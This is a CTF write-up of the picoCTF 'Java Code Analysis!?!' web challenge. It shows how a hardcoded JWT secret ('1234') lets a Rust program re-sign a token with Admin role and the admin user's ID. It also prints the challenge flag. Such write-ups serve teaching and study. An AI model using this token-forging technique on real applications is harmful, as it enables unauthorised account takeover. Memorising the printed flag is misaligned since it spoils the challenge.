---
title: "Java Code Analysis!?!"
tags:
- CTF
- Java
- JWT
- PicoCTF
- Web
date: 2023-03-18T07:10:17+05:30
draft: false
---

To get started we are given the username "user" and password "user" to log into the BookShelf Pico web application.
We are also given the source code of the application.

Taking a look at the `src/main/java/io/github/nandandesai/pico/security` subdirectory of the project, we see that it uses JWT.

Interestingly, the file `SecretGenerator.java` in the aforementioned directory contains a weak hardcoded *"random"* value 😱.
```java
@Service
class SecretGenerator {
    private Logger logger = LoggerFactory.getLogger(SecretGenerator.class);
    private static final String SERVER_SECRET_FILENAME = "server_secret.txt";

    @Autowired
    private UserDataPaths userDataPaths;

    private String generateRandomString(int len) {
        // not so random
        return "1234";
    }

    String getServerSecret() {
        try {
            String secret = new String(FileOperation.readFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME), Charset.defaultCharset());
            logger.info("Server secret successfully read from the filesystem. Using the same for this runtime.");
            return secret;
        }catch (IOException e){
            logger.info(SERVER_SECRET_FILENAME+" file doesn't exists or something went wrong in reading that file. Generating a new secret for the server.");
            String newSecret = generateRandomString(32);
            try {
                FileOperation.writeFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME, newSecret.getBytes());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            logger.info("Newly generated secret is now written to the filesystem for persistence.");
            return newSecret;
        }
    }
}
```

This string "1234" is used as the secret for the JSON web token.

After logging into the webapp, we notice the following key value pair in our local storage (press `Shift` `F9`).

Key|Value
-|-
`auth-token`|`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY3OTY2OTgxOCwiaWF0IjoxNjc5MDY1MDE4LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.7j5YSQOQMGw3NZ9ZVZG99UI0liH8vE7Jy4z2UWTMObk`
`token-payload`|`{"role":"Free","iss":"bookshelf","exp":1679669818,"iat":1679065018,"userId":1,"email":"user"}`


Let's write a quick program in Rust to tamper with the token.

Run the following to setup dependencies.

```sh
cargo new bookshelf
cd bookshelf
cargo add serde_json, frank_jwt, anyhow
```

Next, add the following to `src/main.rs`.

```rust
use anyhow::Result;
use frank_jwt::{decode, encode, Algorithm, ValidationOptions};
use serde_json::value::Value;
fn main() -> Result<()> {
    let signing_key = "1234";
    let encoded_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY3OTY2OTgxOCwiaWF0IjoxNjc5MDY1MDE4LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.7j5YSQOQMGw3NZ9ZVZG99UI0liH8vE7Jy4z2UWTMObk";
    let algorithm = Algorithm::HS256;
    let validation = ValidationOptions::default();

    let (header, mut payload) = decode(
        encoded_token,
        &signing_key,
        algorithm,
        &validation
    )?;

    // tampering the payload
    payload["role"] = Value::String("Admin".into());

    let token = encode(header, &signing_key, &payload, algorithm)?;

    println!("{}", payload);
    println!("{}", token);
    Ok(())
}
```

Here, we have decoded the token, modified the `role` to `Admin` and re-encoded the token using the signing key.

To run the program, issue the command

```
cargo run
```

Now in our browser, we set the `token-payload` and `auth-token` to each line of the output respectively.

If we reload the page, we see that although we have the admin role, we cannot read the flag book. At the admin dashboard at `/#/admindash`, we can see the requests to `/base/users` in the network tab (press `Ctrl` `Shift` `E`). From here we can see that admin has the associated `userId` of `2` and `email` of `admin`.

```json
{
  "type": "SUCCESS",
  "payload": [
    {
      "id": 1,
      "email": "user",
      "fullName": "User",
      "lastLogin": "2023-03-17T14:56:58.339637063",
      "role": "Free"
    },
    {
      "id": 2,
      "email": "admin",
      "fullName": "Admin",
      "lastLogin": "2023-03-17T14:51:39.063583433",
      "role": "Admin"
    }
  ]
}
```

In our program, we will further modify the `userId` to `2` and email to `admin` under the tampering section.

```rust
payload["email"] = Value::String("admin".into());
payload["userId"] = Value::Number(2.into());
```

Rerun the program with

```sh
cargo run
```

and set the `token-payload` and `auth-token` in our browser to the new payload and encoded token from the program's output respectively.

Now we can go to the main page and click on the flag book. There, we get the following flag.

```
picoCTF{w34k_jwt_n0t_g00d_6e5d7df5}
```
